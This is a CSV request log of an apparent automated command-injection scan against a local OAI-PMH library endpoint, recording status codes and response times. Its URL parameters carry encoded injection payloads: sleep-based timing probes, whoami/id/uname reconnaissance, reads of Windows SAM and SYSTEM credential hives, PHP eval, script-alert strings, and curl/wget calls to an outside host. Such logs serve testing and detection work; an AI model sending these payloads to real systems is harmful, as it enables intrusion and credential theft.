uuid,timestamp,http_status_code,request_url,response_time,http_version
c1d77aa0-8ffd-4ed7-ad07-9eedf50fbef4,2024-12-31 01:20:41,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B+sleep+10,2075.53 ms,HTTP/1.1
9c51a9b0-7d6d-4900-864e-5ea6e228a15e,2024-12-31 01:20:43,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3B+sleep+10,2097.78 ms,HTTP/1.1
6a846d38-bb4f-4694-9eb4-7cd91b45f178,2024-12-31 01:20:46,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+sleep+10&metadataPrefix=marc,2076.58 ms,HTTP/1.1
aee50037-d48d-4b27-9c92-e21332102143,2024-12-31 01:20:48,403,http://localhost:8081/oai/request?verb=%3B+sleep+15,2069.47 ms,HTTP/1.1
a951c36a-18d7-4529-a498-28ba1d90c0a4,2024-12-31 01:20:50,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+sleep+15,2060.43 ms,HTTP/1.1
f5936778-ac28-4685-b123-9b09d3e5296c,2024-12-31 01:20:52,200,http://localhost:8081/oai/request?verb=ListSets,2032.37 ms,HTTP/1.1
5d347b7b-ddb0-4502-b47a-6c585f587786,2024-12-31 01:20:55,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B+sleep+15&until=%3B+sleep+15&set=%3B+sleep+15,2089.83 ms,HTTP/1.1
4da55c18-eef8-43fe-a77c-b2fb0686fdc8,2024-12-31 01:20:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2048.75 ms,HTTP/1.1
7d56a25d-dc18-4996-b67d-1b229789a594,2024-12-31 01:20:59,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+sleep+15&metadataPrefix=oai_dc,2133.48 ms,HTTP/1.1
062497e7-ce4f-4a4f-80e5-ed91e980cb32,2024-12-31 01:21:01,403,http://localhost:8081/oai/request?verb=%3B+sleep+5,2041.53 ms,HTTP/1.1
9dd0ea85-e865-48aa-8828-5794f36c0b35,2024-12-31 01:21:04,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+sleep+5,2085.15 ms,HTTP/1.1
4d42a7b9-2d88-439d-9531-f82695feff26,2024-12-31 01:21:06,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+sleep+5,2059.07 ms,HTTP/1.1
c43bda34-778b-4ffd-914b-5f8cde5e7de4,2024-12-31 01:21:08,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3B+sleep+5&set=%3B+sleep+5,2053.80 ms,HTTP/1.1
be2a123e-1315-4d82-8325-ed8ac5079f3c,2024-12-31 01:21:11,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3B+sleep+5,2066.58 ms,HTTP/1.1
8d7573ec-f49e-4e3b-aed2-97be3d3463ec,2024-12-31 01:21:13,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+sleep+5&metadataPrefix=marc,2056.93 ms,HTTP/1.1
6225b783-db16-4d7b-9985-1b0c78361c96,2024-12-31 01:21:15,403,http://localhost:8081/oai/request?verb=%3B+sysinfo,2037.31 ms,HTTP/1.1
f3669aa2-7e01-4413-b651-932a253e9f77,2024-12-31 01:21:17,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+sysinfo,2055.91 ms,HTTP/1.1
2ceb2fb7-b20f-466d-bed0-32a81d7de48f,2024-12-31 01:21:20,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+sysinfo,2082.85 ms,HTTP/1.1
b6559375-08c8-4ece-a030-b0901e4065f2,2024-12-31 01:21:22,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3B+sysinfo,2069.22 ms,HTTP/1.1
f0fffdaa-6dbd-4cbe-95bf-e73241681e7d,2024-12-31 01:21:24,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B+sysinfo&set=%3B+sysinfo,2078.01 ms,HTTP/1.1
c7ba82e7-2b6d-4bc8-971f-d6b5d0415bb6,2024-12-31 01:21:26,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+sysinfo&metadataPrefix=marc,2055.57 ms,HTTP/1.1
90a63332-d02e-4491-b194-6adbc778be62,2024-12-31 01:21:29,403,http://localhost:8081/oai/request?verb=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,2077.66 ms,HTTP/1.1
6188dd5a-f1b0-402b-96f4-de2ab5d022a2,2024-12-31 01:21:31,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,2054.57 ms,HTTP/1.1
d52b7b72-9cd4-4245-bba6-b0baf6486197,2024-12-31 01:21:33,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,2035.44 ms,HTTP/1.1
780217ff-f56c-496d-aaaa-065b348f01c1,2024-12-31 01:21:35,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&until=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,2058.41 ms,HTTP/1.1
5c54dd16-5516-42b9-8be6-be1ed970dc78,2024-12-31 01:21:38,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2052.32 ms,HTTP/1.1
a149f697-91a1-431d-ae1b-017892c938dd,2024-12-31 01:21:40,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&metadataPrefix=oai_dc,2039.36 ms,HTTP/1.1
6d03b41d-530d-4f89-a358-e077d10845e2,2024-12-31 01:21:42,403,http://localhost:8081/oai/request?verb=%3B+system%28%27sleep+5%27%29%3B,2049.78 ms,HTTP/1.1
641293e1-77c4-468e-a888-f20b99b0a8e0,2024-12-31 01:21:45,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2061.00 ms,HTTP/1.1
94951581-93e6-4628-bc1a-60b9151734e4,2024-12-31 01:21:47,200,http://localhost:8081/oai/request?verb=ListSets,2069.66 ms,HTTP/1.1
3cfb5026-7738-4c77-b5c5-3b0802f08603,2024-12-31 01:21:49,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3B+system%28%27sleep+5%27%29%3B,2023.53 ms,HTTP/1.1
eefef462-2c6a-4404-ac68-7dca957102de,2024-12-31 01:21:51,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3B+system%28%27sleep+5%27%29%3B,2049.41 ms,HTTP/1.1
c50eaa13-3d40-4dd3-90cd-5a521bb9c92e,2024-12-31 01:21:54,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+system%28%27sleep+5%27%29%3B&metadataPrefix=oai_dc,2039.14 ms,HTTP/1.1
3c34a850-2f39-46ee-aa8d-d09408ac7fb8,2024-12-31 01:21:56,403,http://localhost:8081/oai/request?verb=%3B+systeminfo,2079.08 ms,HTTP/1.1
665a22a9-69b3-46c4-ba9b-258670fffcbf,2024-12-31 01:21:58,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2052.61 ms,HTTP/1.1
dfdd552d-3ea2-4136-a8c6-47194a7ada26,2024-12-31 01:22:00,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+systeminfo,2044.54 ms,HTTP/1.1
c88b808a-73c6-4a02-8b9b-8d3430a49424,2024-12-31 01:22:03,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3B+systeminfo&set=%3B+systeminfo,2050.32 ms,HTTP/1.1
7bb1c6e5-e64d-4b2f-9e83-9861c35a8491,2024-12-31 01:22:05,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3B+systeminfo,2055.75 ms,HTTP/1.1
5aa1bf33-e20c-4f9a-8ffd-5029beb004e9,2024-12-31 01:22:07,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+systeminfo&metadataPrefix=oai_dc,2046.15 ms,HTTP/1.1
13675a94-775d-4395-adf7-ffb156cd6069,2024-12-31 01:22:09,403,http://localhost:8081/oai/request?verb=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM,2019.45 ms,HTTP/1.1
391a8c64-a1d5-4de1-951d-75a8c69644bb,2024-12-31 01:22:12,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM,2052.39 ms,HTTP/1.1
08d16235-b8de-4893-9f99-13ff3bb930d8,2024-12-31 01:22:14,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM,2076.42 ms,HTTP/1.1
e087c1a3-3fcc-4b88-94e1-d8622d35fac4,2024-12-31 01:22:16,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM&set=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM,2038.85 ms,HTTP/1.1
145e6ae7-8fa0-4b70-b479-561a2e0ccc18,2024-12-31 01:22:19,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM,2040.05 ms,HTTP/1.1
6b3ca28a-f5cd-4cf9-8f6e-2eb4ca7b4e3c,2024-12-31 01:22:21,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSAM&metadataPrefix=oai_dc,2076.46 ms,HTTP/1.1
a59fe1c1-0e9b-43de-9c4d-4d39dfb57b76,2024-12-31 01:22:23,403,http://localhost:8081/oai/request?verb=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSYSTEM,2044.68 ms,HTTP/1.1
b95825f6-20ef-460e-8527-89648ccd13f3,2024-12-31 01:22:25,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSYSTEM,2073.88 ms,HTTP/1.1
da4cf30d-05b3-4898-a5ac-a7facd40eff1,2024-12-31 01:22:28,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSYSTEM,2062.36 ms,HTTP/1.1
1825dec3-d473-4d4f-8359-e5988ac69921,2024-12-31 01:22:30,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2084.98 ms,HTTP/1.1
ca6c525d-f4d2-4395-857e-e53fdbb3bea4,2024-12-31 01:22:32,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSYSTEM,2078.91 ms,HTTP/1.1
538db3bc-0aa4-46a3-ae05-cd604d18a11a,2024-12-31 01:22:34,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+type+%25SYSTEMROOT%25%5Crepair%5CSYSTEM&metadataPrefix=marc,2036.05 ms,HTTP/1.1
f0e15089-b800-4a87-8d13-8b988953d345,2024-12-31 01:22:37,403,http://localhost:8081/oai/request?verb=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM,2085.84 ms,HTTP/1.1
b21cdf17-6c08-43dc-b8f4-c501417b447d,2024-12-31 01:22:39,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM,2064.21 ms,HTTP/1.1
bd9892da-670d-4454-aa0d-831bf04e4ad8,2024-12-31 01:22:41,200,http://localhost:8081/oai/request?verb=ListSets,2042.49 ms,HTTP/1.1
aec11124-98b8-4451-adf1-bd631ca16444,2024-12-31 01:22:44,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM&until=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM&set=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM,2077.86 ms,HTTP/1.1
6741f7bc-7deb-4129-b8eb-a468b36ecef8,2024-12-31 01:22:46,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3B+type+C%3A%5CWINNT%5Crepair%5CSAM,2076.44 ms,HTTP/1.1
2e7a6a2e-0016-416b-b858-a3d4000c9db2,2024-12-31 01:22:50,403,http://localhost:8081/oai/request?verb=%3B+type+C%3A%5CWindows%5Crepair%5CSAM,2083.04 ms,HTTP/1.1
3942bbae-34b8-4f23-8fd1-2fd3e4ebb897,2024-12-31 01:22:53,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+type+C%3A%5CWindows%5Crepair%5CSAM,2094.29 ms,HTTP/1.1
79546f04-213f-4376-a31e-6ecde4d20a47,2024-12-31 01:22:55,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+type+C%3A%5CWindows%5Crepair%5CSAM,2047.44 ms,HTTP/1.1
26f661c8-0fef-4320-af5a-c5a2e0a3a8c6,2024-12-31 01:22:57,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3B+type+C%3A%5CWindows%5Crepair%5CSAM&set=%3B+type+C%3A%5CWindows%5Crepair%5CSAM,2047.76 ms,HTTP/1.1
9c89a8a0-77ae-41c4-b761-bd318025de90,2024-12-31 01:23:00,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B+type+C%3A%5CWindows%5Crepair%5CSAM&set=%3B+type+C%3A%5CWindows%5Crepair%5CSAM,2047.03 ms,HTTP/1.1
c968e530-b2aa-4c9d-a605-9558cf6d3652,2024-12-31 01:23:02,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+type+C%3A%5CWindows%5Crepair%5CSAM&metadataPrefix=marc,2030.66 ms,HTTP/1.1
4ae08d60-9736-48e1-b8a5-a9ec3ba4d1c4,2024-12-31 01:23:04,403,http://localhost:8081/oai/request?verb=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM,2054.44 ms,HTTP/1.1
ff9afa3f-eb5e-44e1-8e7f-a11690386053,2024-12-31 01:23:06,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2071.99 ms,HTTP/1.1
8786bfed-1100-4faf-b494-f947faf60718,2024-12-31 01:23:09,200,http://localhost:8081/oai/request?verb=ListSets,2090.77 ms,HTTP/1.1
ce9eff1e-5bb0-466f-ba85-92b5a05d244b,2024-12-31 01:23:11,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM&set=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM,2041.95 ms,HTTP/1.1
c50400dc-5006-424d-be90-a117c749d812,2024-12-31 01:23:13,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM&until=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM&set=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM,2064.58 ms,HTTP/1.1
ce9d7014-2ed7-423c-a8e1-a6e603779717,2024-12-31 01:23:15,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+type+C%3A%5CWindows%5Crepair%5CSYSTEM&metadataPrefix=marc,2073.90 ms,HTTP/1.1
1c1c1bf4-68ae-4f47-8081-82337310eb8d,2024-12-31 01:23:18,403,http://localhost:8081/oai/request?verb=%3B+uname+-a,2048.64 ms,HTTP/1.1
533c6693-8ee3-4b6d-9b65-13cad77f5d2e,2024-12-31 01:23:20,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+uname+-a,2062.79 ms,HTTP/1.1
0e7e00c3-5b12-4960-8b88-e79ee568708f,2024-12-31 01:23:22,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+uname+-a,2046.29 ms,HTTP/1.1
ef1b596a-2dc5-413c-99aa-831ab8087f12,2024-12-31 01:23:24,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3B+uname+-a,2045.52 ms,HTTP/1.1
64055792-1792-4fe9-8698-072851766dd0,2024-12-31 01:23:27,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3B+uname+-a&until=%3B+uname+-a,2046.66 ms,HTTP/1.1
e8449a4e-b91f-456c-b96b-41f1ea120b06,2024-12-31 01:23:29,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+uname+-a&metadataPrefix=oai_dc,2115.32 ms,HTTP/1.1
6bc9100d-b94e-4798-8f0f-53edd7c85f9b,2024-12-31 01:23:31,403,http://localhost:8081/oai/request?verb=%3B+wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt,2034.63 ms,HTTP/1.1
feac84a4-6167-47d1-bbd4-462d63bdd596,2024-12-31 01:23:34,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2082.65 ms,HTTP/1.1
8fb7829b-96e5-4acc-9398-e420b38b26d8,2024-12-31 01:23:36,200,http://localhost:8081/oai/request?verb=ListSets,2090.65 ms,HTTP/1.1
2e113021-3fd6-49b0-8eb6-f4d2fbb2789f,2024-12-31 01:23:38,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2082.93 ms,HTTP/1.1
f2e051d1-f090-4325-b296-c8335e1889ab,2024-12-31 01:23:40,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3B+wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt,2044.17 ms,HTTP/1.1
458ce5db-4273-4813-8ea3-2da2908df1a9,2024-12-31 01:23:43,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt&metadataPrefix=marc,2044.37 ms,HTTP/1.1
d406a4d5-f879-4b10-83d2-a05765bc216f,2024-12-31 01:23:45,403,http://localhost:8081/oai/request?verb=%3B+whoami,2035.88 ms,HTTP/1.1
5e6971fa-4d00-40b5-857b-5bf8703ae4a7,2024-12-31 01:23:47,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B+whoami,2060.67 ms,HTTP/1.1
a8683a04-d729-49bf-8beb-1c1966259a08,2024-12-31 01:23:49,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B+whoami,2068.80 ms,HTTP/1.1
f495fc9b-2822-43a2-b48b-512c9bb77311,2024-12-31 01:23:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3B+whoami&set=%3B+whoami,2046.57 ms,HTTP/1.1
362c9ce3-ec31-49e2-b587-941c5f892d49,2024-12-31 01:23:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B+whoami,2056.81 ms,HTTP/1.1
f6e5f026-48c8-41e5-95ed-c42fa3f12d75,2024-12-31 01:23:56,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B+whoami&metadataPrefix=marc,2057.79 ms,HTTP/1.1
ae128e8a-cc3a-4ccc-b6ec-2e545ba2be33,2024-12-31 01:23:59,403,http://localhost:8081/oai/request?verb=%3B%24%7B%40print%28md5%28RCEVulnerable%29%29%7D%3B,2057.84 ms,HTTP/1.1
15458268-905f-48d3-90c9-b66e59a7d495,2024-12-31 01:24:01,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B%24%7B%40print%28md5%28RCEVulnerable%29%29%7D%3B,2059.36 ms,HTTP/1.1
2c596fa7-8239-4595-82ae-47977ea427e5,2024-12-31 01:24:03,200,http://localhost:8081/oai/request?verb=ListSets,2087.09 ms,HTTP/1.1
8a86a5ee-a373-44b4-a15e-65454ef4a27d,2024-12-31 01:24:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2253.95 ms,HTTP/1.1
e6eeb690-75e3-406b-88b7-3c33dc9c6891,2024-12-31 01:24:08,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B%24%7B%40print%28md5%28RCEVulnerable%29%29%7D%3B&until=%3B%24%7B%40print%28md5%28RCEVulnerable%29%29%7D%3B,2054.83 ms,HTTP/1.1
02e2a5fb-b10e-4ec0-9c29-cea6b51858ce,2024-12-31 01:24:12,403,http://localhost:8081/oai/request?verb=%3B%2Fusr%2Fbin%2Fid%5Cn,2058.49 ms,HTTP/1.1
251309b0-0160-4c41-9cfc-e8ba1e3b9906,2024-12-31 01:24:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B%2Fusr%2Fbin%2Fid%5Cn,2090.99 ms,HTTP/1.1
1451c113-0969-4ff1-98ea-e530bc971ecf,2024-12-31 01:24:17,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B%2Fusr%2Fbin%2Fid%5Cn,2057.59 ms,HTTP/1.1
597d90df-3b14-4077-9db1-0b6f57e2e173,2024-12-31 01:24:19,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3B%2Fusr%2Fbin%2Fid%5Cn,2069.30 ms,HTTP/1.1
f6bf32b5-4e7a-4d1b-8f7c-b1039c8abb38,2024-12-31 01:24:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B%2Fusr%2Fbin%2Fid%5Cn&until=%3B%2Fusr%2Fbin%2Fid%5Cn&set=%3B%2Fusr%2Fbin%2Fid%5Cn,2064.73 ms,HTTP/1.1
241acde0-0a1e-438a-b677-e2441856a6c3,2024-12-31 01:24:26,403,http://localhost:8081/oai/request?verb=%3B%2Fusr%2Fbin%2Fid%7C,2022.99 ms,HTTP/1.1
67aec1b6-3fea-4311-a007-1267a72cf1e9,2024-12-31 01:24:28,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2049.97 ms,HTTP/1.1
25d5e89b-a452-403e-99fd-98b8bde27bf3,2024-12-31 01:24:31,200,http://localhost:8081/oai/request?verb=ListSets,2042.82 ms,HTTP/1.1
62c6dd2a-ba11-4918-8d90-332cd8183517,2024-12-31 01:24:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3B%2Fusr%2Fbin%2Fid%7C,2039.90 ms,HTTP/1.1
728d2d5b-85fc-4195-a53b-7ebd5d09a86c,2024-12-31 01:24:35,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3B%2Fusr%2Fbin%2Fid%7C&set=%3B%2Fusr%2Fbin%2Fid%7C,2071.24 ms,HTTP/1.1
ef1bf075-274a-40b7-acdd-dc0c98ba7906,2024-12-31 01:24:40,403,http://localhost:8081/oai/request?verb=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2056.83 ms,HTTP/1.1
50b145f4-6cf9-4588-bec7-fb7345f653cf,2024-12-31 01:24:42,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2055.69 ms,HTTP/1.1
24410573-36b2-4649-9dec-bdc12cb2f5a8,2024-12-31 01:24:44,200,http://localhost:8081/oai/request?verb=ListSets,2018.77 ms,HTTP/1.1
a24df480-d3c8-4eca-8995-366b5a1527cf,2024-12-31 01:24:46,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27&until=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27&set=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2080.78 ms,HTTP/1.1
c42ee75c-ca85-440b-9d91-282c24963c49,2024-12-31 01:24:49,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2078.38 ms,HTTP/1.1
7ddfa13a-bc2f-42fe-9b2b-fafebd01a761,2024-12-31 01:24:51,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Becho+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27&metadataPrefix=marc,2062.30 ms,HTTP/1.1
f03c2d4b-9520-4f2c-ba1d-4e0c5fa60872,2024-12-31 01:24:53,403,http://localhost:8081/oai/request?verb=%3Becho%2520%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2087.39 ms,HTTP/1.1
ae60af09-2d95-428d-9323-fa5e6e18baeb,2024-12-31 01:24:56,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Becho%2520%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2081.65 ms,HTTP/1.1
d4cdc857-4abe-488b-8151-52afcec16461,2024-12-31 01:24:58,200,http://localhost:8081/oai/request?verb=ListSets,2037.37 ms,HTTP/1.1
f0c6b476-7a63-4a1e-a327-c566bb7c89c5,2024-12-31 01:25:00,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Becho%2520%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2042.62 ms,HTTP/1.1
0c0d18fb-10dc-4419-9696-e8c440636007,2024-12-31 01:25:02,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Becho%2520%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27,2066.61 ms,HTTP/1.1
cc1ee207-5778-4bcf-80ef-2a4bac03dce5,2024-12-31 01:25:05,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Becho%2520%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27&metadataPrefix=marc,2062.99 ms,HTTP/1.1
0333a883-eb7a-408c-abe6-00accb993b91,2024-12-31 01:25:07,403,http://localhost:8081/oai/request?verb=%3Bid,2007.03 ms,HTTP/1.1
23c73efd-d32c-4c5c-aff2-3d4bffa102c9,2024-12-31 01:25:09,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bid,2057.81 ms,HTTP/1.1
79772106-7468-4e5a-9c8a-b7b2acaa0467,2024-12-31 01:25:11,200,http://localhost:8081/oai/request?verb=ListSets,2061.59 ms,HTTP/1.1
ba79ef32-1646-43c0-88fb-52a8cb9bb069,2024-12-31 01:25:14,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Bid,2061.91 ms,HTTP/1.1
7b88915e-b65f-4440-8efc-28c0e7266035,2024-12-31 01:25:16,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Bid,2067.34 ms,HTTP/1.1
5aad554b-df8f-49fa-a8f8-9ceeded67c22,2024-12-31 01:25:21,403,http://localhost:8081/oai/request?verb=%3Bid%3B,2087.85 ms,HTTP/1.1
b00b80d6-9973-4652-b840-67c07957d070,2024-12-31 01:25:23,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2043.84 ms,HTTP/1.1
a5aee4dd-f203-434e-9bd2-5c72b6ef3e70,2024-12-31 01:25:25,200,http://localhost:8081/oai/request?verb=ListSets,2079.53 ms,HTTP/1.1
